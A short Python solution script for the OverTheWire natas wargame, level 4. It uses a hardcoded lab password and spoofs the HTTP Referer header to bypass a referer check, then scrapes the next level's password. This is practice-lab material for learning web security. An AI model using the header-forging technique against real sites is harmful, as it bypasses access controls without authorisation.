import requests
import re

username = 'natas4'
password = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'

url = f'http://{username}.natas.labs.overthewire.org'

headers = { 'Referer' : 'http://natas5.natas.labs.overthewire.org/' }

response = requests.get(url, auth = (username, password), headers = headers)
content = response.text

print(re.findall('The password for natas5 is (.*)', content)[0])